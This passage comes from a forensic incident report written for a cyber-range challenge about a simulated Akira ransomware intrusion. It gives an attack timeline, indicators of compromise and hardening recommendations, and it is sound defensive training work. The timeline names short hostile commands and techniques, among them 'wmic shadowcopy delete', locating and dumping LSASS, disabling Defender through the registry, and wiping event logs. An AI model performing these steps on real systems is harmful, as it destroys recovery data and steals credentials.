  - Entry point via Guacamole RDP

as-srv:
  - updater.exe (Akira ransomware)
  - akira_readme.txt dropped in 3 locations
  - exfil_data.zip (data exfiltration)
  - clean.bat (anti-forensics)
  - Lateral movement via stolen credentials
```

---

## ⏱️ Full Attack Timeline

### Phase 1 — Pre-Staging (January 15, 2026)

| Time (UTC) | Event | Host |
|---|---|---|
| 04:20 | PowerShell spawned via RuntimeBroker.exe | AS-PC2 |
| 04:40 | Administrator account activated | AS-PC2 |
| 04:40 | AnyDesk downloaded via certutil.exe | AS-PC2 |
| 04:41 | AnyDesk installed with password — backdoor established | AS-PC2 |
| 04:52 | `Daniel_Richardson_CV.pdf.exe` downloaded from C2 | AS-PC2 |
| 04:52 | Scheduled Task `MicrosoftEdgeUpdateCheck` created | AS-PC2 |
| 04:53 | WMIC lateral movement to `10.1.0.203` | AS-PC2 |
| 04:55 | RDP to `10.1.0.203` via mstsc.exe | AS-PC2 |

### Phase 2 — Ransomware Attack (January 27, 2026)

| Time (UTC) | Event | Host |
|---|---|---|
| 19:14 | RDP via Guacamole (`10.0.8.5`) | AS-PC2 |
| 19:19 | Second RDP via Guacamole (`10.0.8.8`) | AS-PC2 |
| 19:21 | AnyDesk backdoor activated | AS-PC2 |
| 19:22 | Lateral movement to AS-SRV (as.srv.administrator) | AS-SRV |
| 20:14 | bitsadmin download attempts (failed x5) | AS-PC2 |
| 20:17 | scan.exe downloaded via Invoke-WebRequest | AS-PC2 |
| 20:18 | Network scan of `10.1.0.0/24` | AS-PC2 |
| 20:18 | david.mitchell authenticated to AS-SRV | AS-SRV |
| 21:03 | kill.bat executed — Defender disabled | AS-PC2 |
| 21:03 | Registry tampered (`DisableAntiSpyware=1`) | AS-PC2 |
| 21:11 | `tasklist \| findstr lsass` — LSASS located | AS-PC2 |
| 21:17 | Network shares enumerated (`net view`) | AS-SRV |
| 21:22 | wsync.exe (beacon v1) deployed | AS-PC2 |
| 21:42 | Named pipe to LSASS opened | AS-PC2 |
| 21:45 | LSASS memory dumped (25,864 bytes) | AS-PC2 |
| 22:03 | Shadow copies deleted (`wmic shadowcopy delete`) | AS-PC2 |
| 22:07 | RDP to AS-SRV (as.srv.administrator, `10.0.8.6`) | AS-SRV |
| 22:14 | wsync.exe deployed to AS-SRV | AS-SRV |
| 22:15 | updater.exe (ransomware) deployed | AS-SRV |
| 22:18 | Security event logs wiped (13 channels) | AS-SRV |
| **22:18:33** | **Encryption begins — akira_readme.txt dropped** | AS-SRV |
| 22:20 | clean.bat executed — updater.exe deleted | AS-SRV |
| 22:24 | st.exe deployed — exfil_data.zip created | AS-SRV |

---

## 🌐 IOC Summary

### Network Indicators

| Type | Value | Description |
|---|---|---|
| Domain | `sync.cloud-endpoint.net` | Primary C2 / payload hosting |
| Domain | `cdn.cloud-endpoint.net` | Ransomware staging domain |
| IP | `172.67.174.46` | C2 IP (Cloudflare) |
| IP | `104.21.30.237` | C2 IP (Cloudflare) |
| IP | `88.97.164.155` | Attacker external IP |
| Domain | `relay-0b975d23.net.anydesk.com` | AnyDesk C2 relay |
| IP | `10.0.8.5` | Guacamole relay (internal) |
| IP | `10.0.8.8` | Guacamole relay (internal) |

### File Indicators

| Filename | SHA256 | Location |
|---|---|---|
| `wsync.exe` (v1) | `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b` | `C:\ProgramData\` |
| `wsync.exe` (v2) | `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` | `C:\ProgramData\` |
| `updater.exe` | `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b` | `C:\ProgramData\` |
| `scan.exe` | `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` | `C:\Users\david.mitchell\Downloads\` |
| `kill.bat` | `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` | `C:\ProgramData\` |
| `st.exe` | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` | `C:\ProgramData\` |

---

## 🛡️ Recommendations

### Immediate Actions
1. **Isolate** AS-PC2 and AS-SRV from the network
2. **Reset** all credentials — `David.Mitchell`, `as.srv.administrator`, and local Administrator
3. **Block** C2 infrastructure: `sync.cloud-endpoint.net`, `cdn.cloud-endpoint.net`, `88.97.164.155`
4. **Remove** AnyDesk and all unauthorized RMM tools
5. **Delete** scheduled task `MicrosoftEdgeUpdateCheck`

### Short-Term Hardening
1. Enable **Windows Defender Tamper Protection**
2. Implement **Credential Guard** to protect LSASS
3. Restrict **WMIC, bitsadmin, certutil** via AppLocker/WDAC
4. Alert on executables created in `C:\Users\Public\` and `C:\ProgramData\`
5. Establish an **approved RMM baseline**

### Long-Term Improvements
1. **Immutable backups** — Azure Blob/AWS S3 Object Lock
2. **Network segmentation** — isolate workstations from servers
3. **MFA on all RDP access**
4. **EDR custom detection rules** for all TTPs observed

---

## 📚 References

- [MITRE ATT&CK — Akira Ransomware](https://attack.mitre.org/)
- [CISA Advisory AA24-109A — Akira Ransomware](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a)
- [SancLogic Ops — Investigation Guide](https://sanclogic.com/sanclogic-ops)

---

*Report prepared by Sebastian Chrzanowski | SancLogic Cyber Range — The Buyer Challenge | January 2026*
